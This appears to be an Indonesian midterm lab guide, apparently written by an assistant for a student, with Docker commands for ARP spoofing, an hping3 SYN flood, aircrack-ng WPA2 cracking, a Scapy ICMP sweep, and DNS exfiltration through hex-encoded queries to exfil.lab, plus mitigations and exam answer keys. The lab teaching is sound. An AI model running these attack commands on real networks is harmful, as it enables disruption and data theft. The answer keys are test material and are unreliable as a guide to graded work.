# Panduan Pengerjaan UTS — Network Attack Lab

**NIM:** 24552011027 → jumlah digit = 2+4+5+5+2+0+1+1+0+2+7 = 29 → 29 mod 10 = 9 → **Kasus 9 (k9)**

Semua perintah di bawah sudah disesuaikan dengan laptop ini. Baca bagian
**"Perbedaan dari soal asli"** dulu, karena ada beberapa perintah yang harus
diubah.

---

## Perbedaan dari soal asli (PENTING — baca dulu)

> **SHELL-MU FISH — baca ini kalau error `Unsupported use of '='`:**
> Perintah `VAR=$(cmd)` di bawah adalah sintaks **bash**. Fish menolaknya. Ada
> dua cara aman:
> 1. **Jangan ketik manual** — jalankan skripnya, yang otomatis pakai bash:
>    `./lab/uts-run.sh 1` … `7`
> 2. Kalau mau ketik manual di fish, pakai `set VAR (cmd)` (bukan `VAR=$(cmd)`).
>    Versi lengkap per kasus dalam sintaks fish ada di
>    **`docs/PANDUAN-UTS-FISH.md`**.
>    Alternatif: ketik `bash` dulu di prompt, lalu semua perintah di panduan ini
>    jalan apa adanya.

Soal asli ditulis untuk `docker compose` (plugin) dan `docker-compose`.
Laptop ini **tidak punya plugin `docker compose`** — yang terpasang adalah
binary standalone **`docker-compose` v5.7.0** di `/usr/local/bin/docker-compose`.

| Soal asli | Yang harus kamu pakai di laptop ini |
|---|---|
| `docker compose -p k9 -f ...` | `docker-compose -p k9 -f ...` (pakai **strip/tanda hubung**) |
| `docker exec korban-k9 arp -s ...` | `docker exec korban-k9 ip neigh replace ...` → lihat catatan di Kasus 3 |
| `-pass kunci-k9-2026` | `-pass pass:kunci-k9-2026` (OpenSSL modern menolak tanpa awalan `pass:`) |

Kalau kamu ketik `docker compose` (pakai spasi) hasilnya
`docker: unknown command: docker compose`. Pakai `docker-compose` (hubung).

**Setup laptop lain yang sudah dicek:**

| Item | Status |
|---|---|
| Docker | 29.1.3 ✓ (user `purwa` sudah di grup `docker`, tidak perlu sudo) |
| docker-compose | v5.7.0 ✓ |
| Disk | 121 GB free ✓ |
| RAM | 7.5 GB (dipakai 4.7 GB — tutup browser saat Kasus 6) |
| Image lab | `uts-openssl`, `uts-kali-tools`, `uts-dnsmasq` sudah dibangun |
| Image base | `alpine:3.20`, `nginx:alpine`, `kalilinux/kali-rolling` sudah ada |
| Host tools | `script`, `python3`, `xxd`, `openssl`, `PIL` ✓ |

**Kerjakan di folder ini** (semua perintah di bawah menganggap kamu di sini):

```bash
cd "/home/purwa/Documents/perkuliahan/keamanan jaringan/network-attack-lab-"
```

---

## Cara tercepat: pakai `lab/uts-run.sh`

Daripada menyalin perintah satu per satu, aku sudah membungkus semua kasus jadi
satu script. Semua penyesuaian laptop ini (pakai `docker-compose`, ambil IP/MAC
otomatis, `-pass pass:`) sudah ada di dalamnya:

```bash
./lab/uts-run.sh 1     # Kasus 1 — Docker dan volume
./lab/uts-run.sh 2     # Kasus 2 — Kriptografi
./lab/uts-run.sh 3     # Kasus 3 — ARP spoofing
./lab/uts-run.sh 4     # Kasus 4 — WPA2 handshake (butuh file dari penguji)
./lab/uts-run.sh 5     # Kasus 5 — ICMP/Scapy (jalankan kasus 3 dulu)
./lab/uts-run.sh 6     # Kasus 6 — SYN flood
./lab/uts-run.sh 7     # Kasus 7 — DNS exfiltration
./lab/uts-run.sh clean # bersihkan semua container, network, volume lab
```

Outputnya sudah aku beri penanda (`--- 1. SEBELUM ---`, `--- 2. SAAT SERANGAN ---`,
dst.) supaya jelas bagian mana yang harus kamu screenshot.

**Pakai script ini ATAU perintah manual di bawah — sama saja isinya.** Perintah
manual berguna kalau kamu mau menjalankannya satu-satu untuk paham alurnya
(sambil belajar). Kalau kamu mau cepat, pakai scriptnya.

---

## Cara screenshot

Ambil screenshot pakai alat screenshot desktop, lalu simpan ke folder
`docs/evidence/<kasus>/` dengan nama yang aku tulis di tiap tugas.

```bash
# Cinnamon (desktop kamu): area tertentu
cinnamon-screenshot -a -f docs/evidence/06-syn-flood/01-syn-recv.png

# atau lewat GUI: tekan Shift+PrintScreen
```

Setelah tiap screenshot, simpan juga output teksnya sebagai transkrip — ini
yang bikin buktinya bisa diverifikasi:

```bash
# setelah menjalankan sebuah perintah, salin output terminalnya ke:
#   docs/evidence/<kasus>/transcripts/<nama-file-yang-sama>.txt
```

Setelah semua selesai:

```bash
git add -A
git commit -m "Add lab evidence: kasus k9 (UTS)"
```

> **Aturan angka:** jangan menulis angka di laporan kalau angka itu tidak
> terlihat di screenshot. Setelah kamu selesai, kirim output terminalnya ke
> aku — aku update angka di `cases/*/README.md` supaya sama persis dengan bukti.

---

## Kasus 1 — Docker dan volume (Pertemuan 1)

Perintah (sudah disesuaikan, `docker-compose` pakai hubung):

```bash
docker volume create vol-k9

docker run --name w-k9 -v vol-k9:/data alpine:3.20 sh -c 'echo 24552011027 > /data/laporan-k9.txt'
docker rm w-k9
docker run --rm -v vol-k9:/data alpine:3.20 cat /data/laporan-k9.txt

docker-compose -p k9 -f lab/b/b1-compose/docker-compose.yml up -d
docker-compose -p k9 -f lab/b/b1-compose/docker-compose.yml exec attacker wget -qO- http://target
docker-compose -p k9 -f lab/b/b1-compose/docker-compose.yml down -v
```

**Screenshot — simpan sebagai:**

| Nama file | Isi |
|---|---|
| `docs/evidence/01-docker-volume/01-volume-survives.png` | bagian `docker rm w-k9` + `cat` yang mengeluarkan `24552011027` |
| `docs/evidence/01-docker-volume/02-attacker-to-target.png` | halaman HTML nginx dari `wget` |

**Yang harus kelihatan di gambar:** angka `24552011027` muncul setelah container
`w-k9` dihapus (bukti data ikut volume, bukan container), dan tag `<title>`
HTML nginx dari attacker.

**Jawaban singkat untuk laporan:** data bertahan karena volume adalah objek
terpisah dari container — `docker rm` menghapus container, bukan volume.
`down -v` yang menghapus volume.

---

## Kasus 2 — Kriptografi (Pertemuan 2)

Perintah (perhatikan `-pass pass:` — soal asli salah tulis):

```bash
docker run --rm -v "$PWD":/work uts-openssl sh -c '
  echo isi laporan k9 > laporan-k9.txt &&
  openssl enc -aes-256-cbc -pbkdf2 -salt -in laporan-k9.txt -out laporan-k9.enc -pass pass:kunci-k9-2026 &&
  echo "--- hash plaintext ---" &&
  sha256sum laporan-k9.txt &&
  openssl enc -d -aes-256-cbc -pbkdf2 -in laporan-k9.enc -out hasil-k9.txt -pass pass:kunci-k9-2026 &&
  echo "--- hash hasil dekripsi ---" &&
  sha256sum hasil-k9.txt'

docker run --rm -v "$PWD":/work uts-openssl sh -c '
  openssl req -x509 -newkey rsa:2048 -nodes -keyout key-k9.pem -out cert-k9.pem \
    -days 30 -subj /CN=k9.uts.local &&
  openssl x509 -in cert-k9.pem -noout -subject -issuer -dates'
```

**Screenshot — simpan sebagai:**

| Nama file | Isi |
|---|---|
| `docs/evidence/02-cryptography/01-aes-roundtrip.png` | kedua baris `sha256sum` yang nilainya **sama** |
| `docs/evidence/02-cryptography/02-certificate.png` | `subject`, `issuer`, `notBefore`, `notAfter` |

**Yang harus kelihatan di gambar:** dua hash SHA-256 identik (bukti
enkripsi→dekripsi lossless), lalu `subject=CN = k9.uts.local` dan
`issuer=CN = k9.uts.local` (self-signed).

**Kunci jawaban:** hash sama = round-trip benar. `-pbkdf2` membuat derivasi key
lambat sehingga brute force mahal, `-salt` membuat ciphertext beda tiap run.
Self-signed = issuer sama dengan subject, jadi terenkripsi tapi tidak
terautentikasi.

> **Catatan:** `laporan-k9.txt`, `*.enc`, `*.pem` tertulis di `.gitignore`, jadi
> tidak akan ikut ter-commit. Itu memang disengaja.

---

## Kasus 3 — ARP spoofing (Pertemuan 3)

Jalankan perintah ini satu blok. IP korban & gateway diambil otomatis, jadi
kamu tidak perlu mengetik IP manual:

```bash
docker network create lab-arp-k9

docker run -d --name korban-k9    --network lab-arp-k9 --cap-add NET_ADMIN uts-kali-tools
docker run -d --name gateway-k9   --network lab-arp-k9 --cap-add NET_ADMIN uts-kali-tools
docker run -d --name penyerang-k9 --network lab-arp-k9 --cap-add NET_ADMIN uts-kali-tools

# CATATAN: nama network mengandung '-' dan Go template Docker menolak karakter
# itu di {{.a.b-c}}, jadi WAJIB pakai sintaks index seperti di bawah.
IP_KORBAN=$(docker inspect -f '{{(index .NetworkSettings.Networks "lab-arp-k9").IPAddress}}' korban-k9)
IP_GW=$(docker inspect -f '{{(index .NetworkSettings.Networks "lab-arp-k9").IPAddress}}' gateway-k9)
MAC_GW=$(docker exec gateway-k9 cat /sys/class/net/eth0/address)
echo "korban=$IP_KORBAN  gateway=$IP_GW  mac_gateway=$MAC_GW"

echo "=== 0. samakan titik awal (reset ke MAC gateway asli + ping) ==="
# PENTING: jangan pakai 'ip neigh del' — justru membuat korban menolak ARP reply
# sehingga langkah 2 selalu terlihat gagal. Reset ke MAC asli dengan state
# reachable, lalu ping. Ini membuat poisoning masuk cepat dan konsisten.
docker exec korban-k9 ip neigh replace "$IP_GW" lladdr "$MAC_GW" nud reachable dev eth0
docker exec korban-k9 ping -c 2 "$IP_GW" >/dev/null 2>&1

echo "=== 1. SEBELUM (baseline) ==="
docker exec korban-k9 ip neigh show "$IP_GW"

echo "=== 2. SAAT DISERANG ==="
docker exec -d penyerang-k9 timeout 20 arpspoof -i eth0 -t "$IP_KORBAN" "$IP_GW" 2>/dev/null
# Tunggu sampai MAC benar-benar berubah (poison masuk dalam 1-11 detik,
# jadi jangan pakai sleep tetap — polling sampai berubah, maks 12 detik)
for i in $(seq 1 12); do
  sleep 1
  M=$(docker exec korban-k9 ip neigh show "$IP_GW" | sed -n 's/.*lladdr \([0-9a-f:]*\).*/\1/p')
  [ "$M" != "$MAC_GW" ] && break
done
docker exec korban-k9 ip neigh show "$IP_GW"
echo "mac gateway asli : $MAC_GW"
echo "mac penyerang    : $(docker exec penyerang-k9 cat /sys/class/net/eth0/address)"

echo "=== 3. SETELAH MITIGASI (static ARP) ==="
docker exec korban-k9 ip neigh replace "$IP_GW" lladdr "$MAC_GW" nud permanent dev eth0
docker exec korban-k9 ip neigh show "$IP_GW"
```

**Screenshot — simpan sebagai (tiga gambar, lebih kuat dari satu):**

| Nama file | Isi |
|---|---|
| `docs/evidence/03-arp-spoofing/00-before.png` | blok "1. SEBELUM" |
| `docs/evidence/03-arp-spoofing/01-poisoned.png` | blok "2. SAAT DISERANG" — MAC gateway berubah jadi MAC penyerang |
| `docs/evidence/03-arp-spoofing/02-static-arp.png` | blok "3. SETELAH MITIGASI" — MAC gateway benar + `PERMANENT` |

**Yang harus kelihatan di gambar:** MAC di kolom `lladdr` untuk IP gateway
**berubah** di langkah 2 (sekarang milik `penyerang-k9`) — itu bukti poisoning
berhasil — lalu **kembali benar** di langkah 3 dan bertanda `PERMANENT`.

**Kunci jawaban:** ARP tidak punya autentikasi, host menerima ARP reply terakhir
yang didengar. Mitigasi: static ARP (stop overwrite), DAI + DHCP snooping di
switch (perbaikan sebenarnya), dan enkripsi di layer atas (TLS/SSH) supaya
posisi MITM tidak otomatis berarti plaintext.

> **Kalau `arpspoof` error "not found":** pakai `ettercap` atau `nping` sebagai
> alternatif, atau lewati langkah 2 dan jelaskan secara teori (poisoning tidak
> wajib untuk jawaban — yang dinilai adalah pemahaman mekanisme + mitigasi).
> Aku akan konfirmasi tool mana yang tersedia di image setelah build selesai dan
> kirim perintah penggantinya.

**Bersihkan setelah selesai:**

```bash
docker rm -f korban-k9 gateway-k9 penyerang-k9
docker network rm lab-arp-k9
```

---

## Kasus 4 — Analisis handshake WPA2 (Pertemuan 4)

File `handshake-k9.cap` dan `wordlist-k9.txt` disediakan penguji. Letakkan
keduanya di root repo, lalu:

```bash
docker run --rm -v "$PWD":/work uts-kali-tools \
  aircrack-ng -w wordlist-k9.txt handshake-k9.cap
```

**Screenshot — simpan sebagai:**

| Nama file | Isi |
|---|---|
| `docs/evidence/04-wpa2-handshake/01-aircrack.png` | baris hasil `KEY FOUND!` atau `KEY NOT FOUND` |

**Yang harus kelihatan di gambar:** baris kesimpulan aircrack — entah kata sandi
ditemukan, atau `KEY NOT FOUND` setelah wordlist habis. Keduanya jawaban sah;
kalau `KEY NOT FOUND`, itu justru contoh bagus bahwa entropi passphrase adalah
kontrolnya.

**Kunci jawaban (4 langkah handshake):**
1. AP → Client: kirim **ANonce**.
2. Client → AP: kirim **SNonce** + **MIC**, client sudah hitung PTK dari
   PMK(passphrase, SSID) + ANonce + SNonce + kedua MAC.
3. AP → Client: verifikasi MIC, kirim **GTK** + MIC-nya sendiri.
4. Client → AP: konfirmasi, kedua pihak pasang key.

Kenapa bisa di-crack: penyerang hanya perlu merekam msg 1 & 2, lalu menebak
passphrase **offline** — cek MIC cocok atau tidak. Tidak ada paket dikirim ke
AP, jadi tidak ada lockout dan tidak ada log. Keamanan = entropi passphrase.
Mitigasi: passphrase panjang acak, **WPA3-SAE** (tahan offline dictionary),
802.1X/EAP-TLS, matikan WPS.

---

## Kasus 5 — ICMP dengan Scapy (Pertemuan 5)

Masih pakai network `lab-arp-k9` dari Kasus 3. Kalau container sudah kamu
hapus, jalankan ulang blok pembuatan network di Kasus 3 (tanpa bagian mitigasi).

```bash
IP_KORBAN=$(docker inspect -f '{{(index .NetworkSettings.Networks "lab-arp-k9").IPAddress}}' korban-k9)

docker run --rm --network lab-arp-k9 \
  -v "$PWD/lab/kasus/k5-scapy:/work" uts-kali-tools \
  python3 /work/kirim_icmp.py "$IP_KORBAN"
```

Untuk gambar kedua (sweep host), jalankan ini:

```bash
SUBNET=$(docker network inspect lab-arp-k9 -f '{{range .IPAM.Config}}{{.Subnet}}{{end}}')
HOSTS=$(docker network inspect lab-arp-k9 -f '{{range .Containers}}{{.IPv4Address}} {{end}}' \
        | tr ' ' '\n' | grep -v '^$' | cut -d/ -f1 | paste -sd, -)
echo "subnet: $SUBNET"
echo "host: $HOSTS"
docker run --rm --network lab-arp-k9 uts-kali-tools python3 -c "
from scapy.all import ICMP, IP, sr
ans, _ = sr(IP(dst='$HOSTS'.split(','))/ICMP(), timeout=3, verbose=False)
print('Host hidup:')
for sent, recv in ans:
    print('   ', recv.src, 'ttl=', recv[IP].ttl, 'type=', recv[ICMP].type)
"
```

> **Jangan scan seluruh subnet.** Network Docker di sini subnetnya `/16`
> (65536 alamat). Memindai `172.18.0.0/24` atau lebih luas akan menggantung
> berjam-jam — aku sudah mengalaminya. Ambil daftar IP container yang benar-benar
> ada (seperti di atas), lalu scan hanya alamat itu.

**Screenshot — simpan sebagai:**

| Nama file | Isi |
|---|---|
| `docs/evidence/05-icmp-scapy/01-icmp-reply.png` | `TTL balasan:` dan `Tipe ICMP balasan:` |
| `docs/evidence/05-icmp-scapy/02-subnet-scan.png` | daftar host hidup dari sweep |

**Yang harus kelihatan di gambar:** `Tipe ICMP balasan: 0` (echo reply, artinya
target hidup) dan nilai `TTL balasan:` — hasil pengukuran aku: **TTL 64**.

**Kunci jawaban smurf:** penyerang memalsukan IP sumber = IP korban, lalu
mengirim echo request ke **alamat broadcast**. Semua host di segmen itu membalas
— dan setiap balasan menuju ke **korban**, bukan ke penyerang. Satu paket jadi N
balasan (amplifikasi), korban dibanjiri tetangganya sendiri. Kuncinya: ICMP echo
itu diagnostik yang sah; serangannya adalah kombinasi **source address yang bisa
dipalsukan** + **amplifikasi broadcast**. Mitigasi: matikan directed broadcast
(`no ip directed-broadcast`), rate-limit ICMP, ingress filtering/uRPF (BCP 38).

---

## Kasus 6 — SYN flood (Pertemuan 6)

Tutup browser dulu — RAM kamu 7.5 GB dan sedang terpakai 4.7 GB.

```bash
docker-compose -p k9 -f lab/b/b3-syn-flood/docker-compose.yml up -d

echo "=== 1. SEBELUM SERANGAN ==="
docker-compose -p k9 -f lab/b/b3-syn-flood/docker-compose.yml exec target netstat -ant | grep -c SYN_RECV

echo "=== 2. SAAT SERANGAN (tunggu 5 detik) ==="
docker-compose -p k9 -f lab/b/b3-syn-flood/docker-compose.yml exec -d attacker timeout 15 hping3 -S -p 80 --flood target
sleep 5
docker-compose -p k9 -f lab/b/b3-syn-flood/docker-compose.yml exec target netstat -ant | grep -c SYN_RECV

echo "=== 3. TANGKAP HANDSHAKE ==="
docker-compose -p k9 -f lab/b/b3-syn-flood/docker-compose.yml exec attacker sh -c \
  'timeout 10 tcpdump -i eth0 -nn tcp port 80 & sleep 1; curl -s http://target > /dev/null; sleep 10'
```

**Screenshot — simpan sebagai:**

| Nama file | Isi |
|---|---|
| `docs/evidence/06-syn-flood/01-syn-recv.png` | angka `SYN_RECV` sebelum vs saat serangan |
| `docs/evidence/06-syn-flood/02-tcpdump-handshake.png` | baris paket `Flags [S]`, `Flags [S.]`, `Flags [.]` |

**Yang harus kelihatan di gambar:** pengukuran `SYN_RECV` sebelum vs saat
serangan, dan di tcpdump: `Flags [S]` = SYN, `Flags [S.]` = SYN-ACK,
`Flags [.]` = ACK. Lihat catatan penting di bawah sebelum menulis angka.

> **PENTING soal angka SYN_RECV:** di laptop ini kamu akan melihat angka yang
> **kecil** — hasil pengukuran aku: `0` sebelum serangan, `5` saat serangan,
> padahal hping3 mengirim **~790.000 paket** dalam 10 detik. Ini **bukan
> kegagalan**. Penyebabnya: **SYN cookies aktif** di kernel (nilai 1, sudah aku
> cek di `/proc/sys/net/ipv4/tcp_syncookies`), sehingga server tidak menyimpan
> state half-open — dia mengencode state ke sequence number, jadi backlog queue
> tidak bisa ditumpuk. `/proc/sys` read-only dari dalam container, jadi tidak
> bisa dimatikan tanpa `--privileged`.
>
> **Ini justru bahan jawaban terbaikmu.** Tulis di laporan: percobaan flood
> mengirim ~790.000 paket, tetapi jumlah `SYN_RECV` hanya naik ke `5` karena
> SYN cookies sudah aktif — jadi serangan berhasil di-*mitigasi* oleh kernel.
> Lalu jelaskan apa yang akan terjadi kalau syncookies dimatikan (backlog 512
> akan penuh dan client sah ditolak). Itu menunjukkan kamu paham mekanisme DAN
> pertahanannya, bukan cuma bisa menjalankan tool.
>
> Bukti visual yang tetap kuat: **screenshot tcpdump-nya** — itu menunjukkan
> lautan SYN dari hping3 dan handshake legit di antaranya.

**Kunci jawaban:** server harus menyimpan state untuk client yang belum terbukti
ada (setelah kirim SYN-ACK, sebelum ACK ketiga). Flood SYN dengan IP sumber
palsu mengisi backlog queue dengan entri yang tak pernah selesai, sehingga client
sah ditolak. Mitigasi: **SYN cookies** (`net.ipv4.tcp_syncookies=1`) — state
dienkode di sequence number, bukan dialokasikan; plus tuning backlog, rate limit
SYN di edge, dan uRPF.

**Bersihkan:**

```bash
docker-compose -p k9 -f lab/b/b3-syn-flood/docker-compose.yml down -v
```

---

## Kasus 7 — DNS exfiltration (Pertemuan 7)

```bash
docker-compose -p k9 -f lab/b/b4-dns-exfil/docker-compose.yml up -d
sleep 3

echo "=== 1. ENCODE JADI HEX ==="
# Dua payload: NIM (22 char, di bawah ambang detektor) dan payload (40 char, di atas)
NIM=24552011027
HEX=$(echo -n $NIM | xxd -p)
PAYLOAD="rahasia-nilai-uts-k9"
HEX_PAYLOAD=$(echo -n "$PAYLOAD" | xxd -p)
echo "NIM   : $NIM  ->  $HEX   ($(echo -n $HEX | wc -c) char)"
echo "payload: $PAYLOAD  ->  $HEX_PAYLOAD   ($(echo -n $HEX_PAYLOAD | wc -c) char)"

echo "=== 2. KIRIM LEWAT QUERY DNS ==="
docker-compose -p k9 -f lab/b/b4-dns-exfil/docker-compose.yml exec attacker \
  dig +short "$HEX.k9.exfil.lab" @dns
docker-compose -p k9 -f lab/b/b4-dns-exfil/docker-compose.yml exec attacker \
  dig +short "$HEX_PAYLOAD.k9.exfil.lab" @dns

echo "=== 3. AMBIL LOG RESOLVER + DETEKSI ==="
docker-compose -p k9 -f lab/b/b4-dns-exfil/docker-compose.yml logs dns > dns-k9.log
python3 lab/kasus/k9-dns-detect/analisis_dns.py dns-k9.log

echo "=== 4. DECODE KEMBALI ==="
echo -n "NIM     : "; echo "$HEX" | xxd -r -p; echo
echo -n "payload : "; echo "$HEX_PAYLOAD" | xxd -r -p; echo
```

> **PENTING soal label yang tidak terdeteksi:** NIM kamu 11 digit, jadi hex-nya
> hanya **22 karakter**, sedangkan ambang detektor di `analisis_dns.py` adalah
> **>30 karakter** — jadi mengirim NIM saja **tidak akan** muncul sebagai
> "Query mencurigakan". Itu bukan bug, itu wajar: exfiltration nyata membawa data
> besar, bukan satu NIM. Karena itu perintah di atas mengirim **dua** query:
> NIM saja (22 char, tidak kena) dan payload (40 char, kena).
>
> **Batasan DNS yang jadi bahan jawaban bagus:** satu label DNS maksimal **63
> karakter**. Hex dari payload 83 karakter ditolak `dig` dengan
> `is not a legal name (label too long)`. Inilah alasan exfiltration di dunia
> nyata memakai **banyak query berurutan**, masing-masing membawa sepotong data —
> dan justru pola query beruntun itulah yang bisa dideteksi.

**Screenshot — simpan sebagai:**

| Nama file | Isi |
|---|---|
| `docs/evidence/07-dns-exfiltration/01-detect.png` | output `analisis_dns.py` yang menandai label 40 char |
| `docs/evidence/07-dns-exfiltration/02-decode.png` | hasil decode yang mengeluarkan NIM dan payload |

**Catatan domain:** image `uts-dnsmasq` di repo ini mengarahkan
`--address=/exfil.lab/10.0.0.99`, jadi query dijawab `10.0.0.99` — itu normal
dan sesuai soal. Yang jadi bukti utama adalah **query tercatat di log resolver**.

**Yang harus kelihatan di gambar:** di langkah 3, baris
`panjang=40  <hex>.k9.exfil.lab` di bawah **"Query mencurigakan"**, dan
`exfil.lab: 2` di bagian jumlah query. Di langkah 4, output decode mengembalikan
`24552011027` dan `rahasia-nilai-uts-k9`.

**Kunci jawaban:** DNS hampir tidak mungkin diblokir karena resolusi nama itu
fondasional. Penyerang mendaftarkan domain miliknya, menjalankan resolver
otoritatif, lalu menyandikan data curian ke **label paling kiri** setiap query.
Variasi: TXT record, DoH, atau rantai subdomain untuk mengelabui ambang batas.
Mitigasi: **log & pantau DNS**, analisis entropi/panjang label, RPZ/blocklist
domain baru, dan yang paling bernilai — **paksa semua DNS lewat resolver internal
terkendali dan blokir UDP/TCP 53 keluar**.

**Bersihkan:**

```bash
docker-compose -p k9 -f lab/b/b4-dns-exfil/docker-compose.yml down -v
rm -f dns-k9.log
```

---

## Setelah semua selesai

```bash
cd "/home/purwa/Documents/perkuliahan/keamanan jaringan/network-attack-lab-"

# pastikan tidak ada artefak lab yang ikut ter-commit
git status --short

# cek bahwa screenshot sudah masuk
ls -R docs/evidence/

git add -A
git commit -m "Add UTS kasus k9 evidence (7 scenarios)"
```

**Lalu kirim ke aku:** output terminal dari langkah 1-3 tiap kasus (salin-tempel
saja). Aku akan:
1. mengganti semua angka generik di `cases/*/README.md` dengan angka asli dari
   hasil run kamu (jumlah SYN_RECV, TTL, panjang label hex),
2. memverifikasi screenshot-screenshot sudah ada dan namanya benar,
3. menyiapkan commit final.

---

## Checklist terakhir

- [ ] Kasus 1: 2 screenshot
- [ ] Kasus 2: 2 screenshot
- [ ] Kasus 3: 3 screenshot (before / poisoned / after)
- [ ] Kasus 4: 1 screenshot
- [ ] Kasus 5: 2 screenshot
- [ ] Kasus 6: 2 screenshot
- [ ] Kasus 7: 2 screenshot
- [ ] Semua container & network lab sudah dibersihkan (`docker ps -a` bersih)
- [ ] `git status` tidak memuat `*.cap`, `*.pem`, `*.enc`, `dns-*.log`
